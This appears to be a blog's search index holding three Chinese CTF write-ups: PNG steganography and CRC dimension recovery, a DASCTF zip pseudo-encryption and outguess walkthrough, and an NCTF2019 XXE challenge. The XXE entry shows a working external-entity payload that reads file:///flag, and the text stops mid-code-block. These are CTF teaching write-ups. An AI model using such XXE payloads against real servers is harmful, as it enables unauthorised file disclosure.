<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>MISC之图像处理</title>
      <link href="2021/04/01/MISC%E4%B9%8B%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"/>
      <url>2021/04/01/MISC%E4%B9%8B%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="/2021/04/01/MISC%E4%B9%8B%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/1.png"></p><a id="more"></a>        <h2 id="1-附加式图片隐写">          <a href="#1-附加式图片隐写" class="heading-link"><i class="fas fa-link"></i></a>1. 附加式图片隐写</h2>      <p>顾名思义，附加式图片隐写就是使用某种方法在载体文件上附加上需要被隐写的内容，而我们要做的就是根据方法提取出载体文件中被隐藏的内容。在CTF赛事中，常见的附加式图片隐写有两种方式，一种是直接附加字符串，另一种是图片作为其他文件的载体呈现。</p>        <h3 id="1-1-附加字符串">          <a href="#1-1-附加字符串" class="heading-link"><i class="fas fa-link"></i></a>1.1 附加字符串</h3>      <p>附加字符串就是直接在图片内容中增加字符串，一般我们可以使用strings命令进行查看，也可以使用十六进制文件编辑工具进行附加内容查看。</p><p>● strings</p><p>strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。strings命令对识别随机对象文件很有用。 </p><p>命令用法：strings + 文件名</p><p>● 十六进制工具</p><p>使用winhex或者010editor也是可以看到图片中附加的内容。</p>        <h3 id="1-2-文件载体">          <a href="#1-2-文件载体" class="heading-link"><i class="fas fa-link"></i></a>1.2 文件载体</h3>      <p>图片文件的附加式隐写还会作为其他文件的载体的形式出现，最常见的就是图种了。图种就是利用些特殊的方式将图片文件与压缩包文件结合起来的文件，这类的文件一般保存为图片文件格式，可以正常显示图片。由于操作系统识别的过程中是，从文件头标志，到文件的结束标志位，当系统识别到图片的结束标志位后，默认是不再继续识别的，所以我们在通常情况下只能看到它是只是一张图片。对于这类的隐写，我们可以通过十六进制文件编辑工具进行文件提取也可以使用binwalk分离文件。</p>        <h2 id="2-基于文件结构的图片隐写">          <a href="#2-基于文件结构的图片隐写" class="heading-link"><i class="fas fa-link"></i></a>2. 基于文件结构的图片隐写</h2>      <p>下面对PNG图片展开进行介绍 ：</p><p>PNG图像格式文件由一个8字节的文件头和按照特定结构组织的3个以上的数据块（chunk）组成。 </p><p>PNG文件格式：文件头（89 59 4E 47 0D 0A 1A 0A）+数据块+数据块+数据块+…… </p><p>PNG图片定义了两种类型的数据块，一种是称为关键数据块，这是必须的数据块，另一种称为辅助数据块，这是可选的数据块。关键数据块定义了4个标准数据块，分别为IHDR、PLTE、IDAT和IEND，每个PNG文件都必须包含它们，PNG读写软件也都必须要支持这些数据块。每个数据块都会包含长度、数据块类型码、数据块数据和循环冗余校验（CRC）四个部分。这里需要注意的是CRC域的值是数据块类型码和数据域的数据计算而来的。 </p>        <h3 id="2-1-IHDR">          <a href="#2-1-IHDR" class="heading-link"><i class="fas fa-link"></i></a>2.1 IHDR</h3>      <p>文件头数据块IHDR是PNG文件中的第一个数据块，而且一个PNG文件中只能有一个文件头数据块，它包含了PNG文件中存储的图像数据的基本信息，包括了图片的宽，高，图像深度，图像类型，压缩方法等。</p><p><img src="/2021/04/01/MISC%E4%B9%8B%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/2.png"><br>  如图所示，标蓝部分为IHDR数据块，00 09 00 0D代表IHDR头块长13，49 48 44 52代表IHDR标识，00 00 06 76代表图片的宽，00 00 01 F5代表图片的高。其中我们主要关注图片的宽和高。同时，00 09是加密，00 00是未加密。（当存在伪加密时，需要将09改为00）</p><p>在CTF中，经常通过改变宽和高使得图片显示不完整或者无法显示从而达到隐藏信息的目的。对于这种情况，我们不能轻易修改图片的宽或高的值，应该通过CRC的值推算出宽或高的值；或者是修改宽或高的值后，使用CRC计算工具，计算得出新的CRC值替换原本的值，以防图片报错打不开。</p><p><strong>例如：</strong>现有某CTF题目如下，打开为一张图片，可以在Windows下正常打开。</p><p><img src="/2021/04/01/MISC%E4%B9%8B%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/3.png"></p><p>使用tweakpng打开图片可看到提示报错。</p><p><img src="/2021/04/01/MISC%E4%B9%8B%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/4.png"></p><p>由于CRC值计算的是数据块类型码及数据块数据，因此可以通过以下脚本计算出图片的原始宽和高。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">misc = open(<span class="string">&quot;2.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">data = misc[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)+ misc[<span class="number">20</span>:<span class="number">29</span>]</span><br><span class="line">crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line"><span class="keyword">if</span> crc32 == <span class="number">0xCBD6DF8A</span>:</span><br><span class="line"><span class="keyword">print</span> i</span><br></pre></td></tr></table></div></figure><p><img src="/2021/04/01/MISC%E4%B9%8B%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/5.png"></p><p>使用十六进制文件编辑器修改图片的宽和高和得出的结果一致，可得出隐藏在图片中的flag。</p>        <h3 id="2-2-PLTE">          <a href="#2-2-PLTE" class="heading-link"><i class="fas fa-link"></i></a>2.2 PLTE</h3>      <p>调色板数据块 PLTE（palette chunk）：它包含有与索引彩色图像（indexed-color image）相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块（image data chunk）之前。真彩色的 PNG 数据流也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。</p>        <h3 id="2-3-IDAT">          <a href="#2-3-IDAT" class="heading-link"><i class="fas fa-link"></i></a>2.3 IDAT</h3>      <p>图像数据块 IDAT（image data chunk）：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。这是一个可以存在多个数据块类型的数据块。它的作用就是存储着图像真正的数据。IDAT采用 LZ77 算法的派生算法进行压缩，可以用 zlib 解压缩。值得注意的是，IDAT 块只有当上一个块充满时，才会继续一个新的块。</p><p><strong>例如：</strong>某CTF题目相关IDAT的部分解题过程： </p><p>使用pngcheck识别PNG图片文件（或者使用Stegsolve.jar、tweakPNG查看），可以看到正常充满的长度应该是65524，而倒数第二个IDAT并没有充满，就又起了一个IDAT，明显最后一个IDAT有问题。</p><p><img src="/2021/04/01/MISC%E4%B9%8B%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/6.png"></p><p>取出有问题的IDAT块的内容。</p><p><img src="/2021/04/01/MISC%E4%B9%8B%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/7.png"></p><p>去掉长度、数据块类型码（IDAT）以及CRC，只留取数据部分： </p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667 </span><br></pre></td></tr></table></div></figure><p>可查找到789C是zlib的文件头，使用脚本进行解压缩。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">IDAT = <span class="string">&quot;789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">result = binascii.hexlify(zlib.decompress(IDAT))</span><br><span class="line"><span class="keyword">print</span> result</span><br></pre></td></tr></table></div></figure><p><img src="/2021/04/01/MISC%E4%B9%8B%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/8.png"></p><p>根据得出的结果在进行分析结合其他内容得出flag。</p>        <h3 id="2-4-IEND">          <a href="#2-4-IEND" class="heading-link"><i class="fas fa-link"></i></a>2.4 IEND</h3>      <p>图像结束数据 IEND（image trailer chunk）：它用来标记 PNG 文件或者数据流已经结束，并且必须要放在文件的尾部。IEND 数据块的长度总是 00 00 00 00，数据标识总是 IEND 49 45 4E 44，因此，CRC 码也总是 AE 42 60 82。</p><p>转载来自<span class="exturl"><a class="exturl__link" href="https://www.freebuf.com/">FreeBuf.COM</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Misc杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图片隐藏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2021三月赛-简单的png隐写</title>
      <link href="2021/04/01/DASCTF2021%E4%B8%89%E6%9C%88%E8%B5%9B-%E7%AE%80%E5%8D%95%E7%9A%84png%E9%9A%90%E5%86%99/"/>
      <url>2021/04/01/DASCTF2021%E4%B8%89%E6%9C%88%E8%B5%9B-%E7%AE%80%E5%8D%95%E7%9A%84png%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-首先">          <a href="#1-首先" class="heading-link"><i class="fas fa-link"></i></a>1. 首先</h2>      <p><img src="/2021/04/01/DASCTF2021%E4%B8%89%E6%9C%88%E8%B5%9B-%E7%AE%80%E5%8D%95%E7%9A%84png%E9%9A%90%E5%86%99/1.png"></p><a id="more"></a><p>这是一个需要解密的压缩包，托到winhex中</p><p><img src="/2021/04/01/DASCTF2021%E4%B8%89%E6%9C%88%E8%B5%9B-%E7%AE%80%E5%8D%95%E7%9A%84png%E9%9A%90%E5%86%99/2.png"></p>        <h2 id="2-伪加密">          <a href="#2-伪加密" class="heading-link"><i class="fas fa-link"></i></a>2. 伪加密</h2>      <p>结构体的前四个字节50 4B 03 04叫做目录中文件文件头标记；14 00是压缩使用的 pkware 版本； 14 00是解压文件所需 pkware 版本；09 00是全局方式位标记(这里是判断第二个有无加密的地点，00 00为没有加密，09 00 为有加密；伪加密的题目只需要将上面的两个全局方式位标记位改为00 00即可无密码解密！</p><p>猜测是伪加密，将09 00改为00 00</p><p><img src="/2021/04/01/DASCTF2021%E4%B8%89%E6%9C%88%E8%B5%9B-%E7%AE%80%E5%8D%95%E7%9A%84png%E9%9A%90%E5%86%99/3.png"></p><p>解压成功，得到两张图片</p><p><img src="/2021/04/01/DASCTF2021%E4%B8%89%E6%9C%88%E8%B5%9B-%E7%AE%80%E5%8D%95%E7%9A%84png%E9%9A%90%E5%86%99/4.png"></p>        <h2 id="3-查看hint-png">          <a href="#3-查看hint-png" class="heading-link"><i class="fas fa-link"></i></a>3. 查看hint.png</h2>              <h3 id="3-1-方法一">          <a href="#3-1-方法一" class="heading-link"><i class="fas fa-link"></i></a>3.1 方法一</h3>      <p>利用pngcheck工具查看hint.png图片</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pngcheck -v hint.png</span><br></pre></td></tr></table></div></figure><p><img src="/2021/04/01/DASCTF2021%E4%B8%89%E6%9C%88%E8%B5%9B-%E7%AE%80%E5%8D%95%E7%9A%84png%E9%9A%90%E5%86%99/5.png"></p><p>IDAT长度异常，按理说最多只有最后的一个IDAT长度不一致，但是这个有两条异常，所以初步判断，这个包含两张图片。</p><p>把图片托到winhex中，删掉第一段IDAT，保留下面一个。</p><p><img src="/2021/04/01/DASCTF2021%E4%B8%89%E6%9C%88%E8%B5%9B-%E7%AE%80%E5%8D%95%E7%9A%84png%E9%9A%90%E5%86%99/6.png"></p>        <h3 id="3-2-方法二">          <a href="#3-2-方法二" class="heading-link"><i class="fas fa-link"></i></a>3.2 方法二</h3>      <p>使用工具tweakpng，查看hint.png并且删除多余IDAT</p><p><img src="/2021/04/01/DASCTF2021%E4%B8%89%E6%9C%88%E8%B5%9B-%E7%AE%80%E5%8D%95%E7%9A%84png%E9%9A%90%E5%86%99/7.png"></p><p><img src="/2021/04/01/DASCTF2021%E4%B8%89%E6%9C%88%E8%B5%9B-%E7%AE%80%E5%8D%95%E7%9A%84png%E9%9A%90%E5%86%99/8.png"></p><p><img src="/2021/04/01/DASCTF2021%E4%B8%89%E6%9C%88%E8%B5%9B-%E7%AE%80%E5%8D%95%E7%9A%84png%E9%9A%90%E5%86%99/9.png"></p><p>所以是outguess加密，key为89504E。</p>        <h2 id="4-outguess解密">          <a href="#4-outguess解密" class="heading-link"><i class="fas fa-link"></i></a>4. outguess解密</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k 89504E -r flag.jpg -t output.txt</span><br></pre></td></tr></table></div></figure><p><img src="/2021/04/01/DASCTF2021%E4%B8%89%E6%9C%88%E8%B5%9B-%E7%AE%80%E5%8D%95%E7%9A%84png%E9%9A%90%E5%86%99/10.png"></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MUY4QjA4MDg5MTgwNzg1RTAwMDM2NjZDNjE2NzJFNzQ3ODc0MDA0QkNCNDk0Q0FGMzZCMDMwMzQ0RDM1NDlCNjRDMzMzNTMzMzRCMTQ4MzVCNzQ4NEEzNTMzNDg0OTMyMzU0QjRFMzUzMTQ5MzFCNUFDRTVFMjAyMDA0NjhCMjIzRjI4MDAwMDAw</span><br></pre></td></tr></table></div></figure><p>猜测是base64，解密</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1F8B08089180785E0003666C61672E747874004BCB494CAF36B030344D3549B64C33353334B14835B7484A3533484932354B4E35314931B5ACE5E20200468B223F28000000</span><br></pre></td></tr></table></div></figure><p>看着像十六进制，猜测需要十六进制转ASCII，转换为：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x^flag.txtKËIL¯6°04M5I¶L3534±H5·HJ53HI25KN51I1µ¬åâF&quot;?(</span><br></pre></td></tr></table></div></figure>        <h2 id="5-十六进制转文件">          <a href="#5-十六进制转文件" class="heading-link"><i class="fas fa-link"></i></a>5. 十六进制转文件</h2>              <h3 id="5-1-方法一-winhex">          <a href="#5-1-方法一-winhex" class="heading-link"><i class="fas fa-link"></i></a>5.1 方法一(winhex)</h3>      <p>发现有flag.txt字样，猜测可能是个压缩文件，需要将十六进制变成文件，打开winhex-&gt;新建-&gt;size:4-&gt;将十六进制字符粘贴进去-&gt;选择ASCII-Hex</p><p><img src="/2021/04/01/DASCTF2021%E4%B8%89%E6%9C%88%E8%B5%9B-%E7%AE%80%E5%8D%95%E7%9A%84png%E9%9A%90%E5%86%99/11.png"></p><p>保存文件，后缀为gz，zip都可以，如果不知道这个是什么文件，可以拖到kali中<code>file</code>一下。    </p><p><img src="/2021/04/01/DASCTF2021%E4%B8%89%E6%9C%88%E8%B5%9B-%E7%AE%80%E5%8D%95%E7%9A%84png%E9%9A%90%E5%86%99/12.png"></p>        <h3 id="5-2-方法二-python">          <a href="#5-2-方法二-python" class="heading-link"><i class="fas fa-link"></i></a>5.2 方法二(python)</h3>      <p>利用python脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">hexdata = <span class="string">&quot;1F8B08089180785E0003666C61672E747874004BCB494CAF36B030344D3549B64C33353334B14835B7484A3533484932354B4E35314931B5ACE5E20200468B223F28000000&quot;</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;flag.gz&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(unhexlify(hexdata))</span><br></pre></td></tr></table></div></figure><p><img src="/2021/04/01/DASCTF2021%E4%B8%89%E6%9C%88%E8%B5%9B-%E7%AE%80%E5%8D%95%E7%9A%84png%E9%9A%90%E5%86%99/14.png"></p>        <h3 id="5-3-方法三-CyberChef">          <a href="#5-3-方法三-CyberChef" class="heading-link"><i class="fas fa-link"></i></a>5.3 方法三(CyberChef)</h3>      <p>利用<span class="exturl"><a class="exturl__link" href="https://gchq.github.io/CyberChef/">CyberChef</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>工具解密</p><p>直接可以<code>base64-&gt;hex-&gt;Gzip</code>（左边直接search，找到后双击就会移动到recipe中）</p><p><img src="/2021/04/01/DASCTF2021%E4%B8%89%E6%9C%88%E8%B5%9B-%E7%AE%80%E5%8D%95%E7%9A%84png%E9%9A%90%E5%86%99/13.png"></p>]]></content>
      
      
      <categories>
          
          <category> Misc-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图片隐藏 </tag>
            
            <tag> 进制转换 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2019-伪XML食谱</title>
      <link href="2021/04/01/NCTF2019-%E4%BC%AAXML%E9%A3%9F%E8%B0%B1/"/>
      <url>2021/04/01/NCTF2019-%E4%BC%AAXML%E9%A3%9F%E8%B0%B1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-首页">          <a href="#1-首页" class="heading-link"><i class="fas fa-link"></i></a>1. 首页</h2>      <p><img src="/2021/04/01/NCTF2019-%E4%BC%AAXML%E9%A3%9F%E8%B0%B1/1.png"></p><a id="more"></a><p>既然知道是XML，那我们抓个包看一下</p><p><img src="/2021/04/01/NCTF2019-%E4%BC%AAXML%E9%A3%9F%E8%B0%B1/2.png"></p>        <h2 id="2-payload">          <a href="#2-payload" class="heading-link"><i class="fas fa-link"></i></a>2. payload</h2>      <p>可以看到user和passwd都是xml，那我们可以添加恶意实体试试</p><figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span> [<span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>111<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></div></figure><p><img src="/2021/04/01/NCTF2019-%E4%BC%AAXML%E9%A3%9F%E8%B0%B1/3.png"></p>        <h2 id="3-XXE漏洞解析">          <a href="#3-XXE漏洞解析" class="heading-link"><i class="fas fa-link"></i></a>3. XXE漏洞解析</h2>              <h3 id="3-1-简介">          <a href="#3-1-简介" class="heading-link"><i class="fas fa-link"></i></a>3.1 简介</h3>      <p>XXE（XML External Entity Injection）即XML外部实体类注入漏洞。XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。XXE漏洞触发的点往往是可以上传XML文件的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文件。</p>        <h4 id="3-1-1-XML">          <a href="#3-1-1-XML" class="heading-link"><i class="fas fa-link"></i></a>3.1.1 XML</h4>      <p>XML设计用来传送及携带数据信息，不用来表现或展示数据，HTML则用来表现数据，所以XML用途的焦点是它说明数据是什么，以及携带数据信息。</p>        <h4 id="3-1-2-基本语法">          <a href="#3-1-2-基本语法" class="heading-link"><i class="fas fa-link"></i></a>3.1.2 基本语法</h4>      <ul><li>所有 XML 元素都须有关闭标签。</li><li>XML 标签对大小写敏感。</li><li>XML 必须正确地嵌套。</li><li>XML 文档必须有根元素。</li><li>XML 的属性值须加引号。</li><li>XML的注释和HTML一样<code>&lt;!-- --&gt;</code></li></ul>        <h3 id="3-2-DTD">          <a href="#3-2-DTD" class="heading-link"><i class="fas fa-link"></i></a>3.2 DTD</h3>              <h4 id="3-2-1-DTD">          <a href="#3-2-1-DTD" class="heading-link"><i class="fas fa-link"></i></a>3.2.1 DTD</h4>      <p>XML文件的文档类型定义（Document Type Definition）可以看成一个或者多个XML文件的模板，在这里可以定义XML文件中的元素、元素的属性、元素的排列方式、元素包含的内容等等。DTD可定义合法的XML文档构建模块。</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [            &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (nuc,edu)&gt;   &lt;!--定义note元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT nuc (#PCDATA)&gt;    &lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT edu (#PCDATA)&gt;    &lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;nuc&gt;hello&lt;&#x2F;nuc&gt;</span><br><span class="line">&lt;edu&gt;world&lt;&#x2F;edu&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>当使用外部DTD时，通过如下语法引入。</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE outer-element SYSTEM &quot;filename&quot;&gt;</span><br></pre></td></tr></table></div></figure><p>外部DTD实例</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE outer-element SYSTEM &quot;test.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;nuc&gt;hello&lt;&#x2F;nuc&gt;</span><br><span class="line">&lt;edu&gt;world&lt;&#x2F;edu&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></div></figure><p>test.dtd</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT nuc (#PCDATA)&gt;   &lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT edu (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br></pre></td></tr></table></div></figure>        <h4 id="3-2-2-PCDATA">          <a href="#3-2-2-PCDATA" class="heading-link"><i class="fas fa-link"></i></a>3.2.2 PCDATA</h4>      <p>PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。</p><p>不过，被解析的字符数据不应当包含任何&amp;，&lt;，或者&gt;字符，需要用<code>&amp;amp;</code> <code>&amp;lt;</code> <code>&amp;gt;</code>实体来分别替换</p>        <h4 id="3-2-3-CDATA">          <a href="#3-2-3-CDATA" class="heading-link"><i class="fas fa-link"></i></a>3.2.3 CDATA</h4>      <p>CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><p>CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。<br>在 XML 元素中，”&lt;” 和 “&amp;” 是非法的。”&lt;” 会产生错误，因为解析器会把该字符解释为新元素的开始。”&amp;” 也会产生错误，因为解析器会把该字符解释为字符实体的开始。某些文本，比如 JavaScript 代码，包含大量 “&lt;” 或 “&amp;” 字符。为了避免错误，可以将脚本代码定义为 CDATA。CDATA 部分中的所有内容都会被解析器忽略。<br>CDATA 部分由<code>&lt;![CDATA[</code> 开始，由 <code>]]&gt;</code>结束：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;content&gt;&lt;![CDATA[&lt;html&gt;&lt;&#x2F;html&gt;]]&gt;&lt;&#x2F;content&gt;</span><br></pre></td></tr></table></div></figure><p>运行结果</p><p><img src="/2021/04/01/NCTF2019-%E4%BC%AAXML%E9%A3%9F%E8%B0%B1/8.png"></p>        <h4 id="3-2-4-DTD元素">          <a href="#3-2-4-DTD元素" class="heading-link"><i class="fas fa-link"></i></a>3.2.4 DTD元素</h4>      <p><img src="/2021/04/01/NCTF2019-%E4%BC%AAXML%E9%A3%9F%E8%B0%B1/4.png"></p>        <h4 id="3-2-5-DTD属性">          <a href="#3-2-5-DTD属性" class="heading-link"><i class="fas fa-link"></i></a>3.2.5 DTD属性</h4>      <p>属性声明使用以下语法</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br></pre></td></tr></table></div></figure><p>DTD实例</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST nuc edu PCDATA &quot;hello&quot;&gt;</span><br></pre></td></tr></table></div></figure><p>XML实例</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;nuc edu&#x3D;&quot;hello&quot;&gt;</span><br></pre></td></tr></table></div></figure>        <h4 id="3-2-6-DTD实体">          <a href="#3-2-6-DTD实体" class="heading-link"><i class="fas fa-link"></i></a>3.2.6 DTD实体</h4>      <p>DTD是一组标记声明，用于定义XML的文档类型。它定义了XML文档的合法结构块和具有合法元素和属性列表的文档结构。DTD可以在XML文档内部声明，也可以作为外部引用声明—使用SYSTEM标识符指向可解析位置中的另一组声明。ENTITY可以使用SYSTEM关键字，调用外部资源,而这里是支持很多的协议，如:http;file等，然后,在其他DOM结点中可以使用如：<code>&amp;test;</code>引用该实体内容。</p><p><img src="/2021/04/01/NCTF2019-%E4%BC%AAXML%E9%A3%9F%E8%B0%B1/5.png"></p><p><strong>内部实体实例</strong></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note[</span><br><span class="line">&lt;!ELEMENT note (name)&gt;</span><br><span class="line">&lt;!ENTITY hack3r &quot;Hu3sky&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;hack3r;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></div></figure><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>        <h5 id="3-2-6-1-内部实体">          <a href="#3-2-6-1-内部实体" class="heading-link"><i class="fas fa-link"></i></a>3.2.6.1 内部实体</h5>      <p>一个内部实体声明例子</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 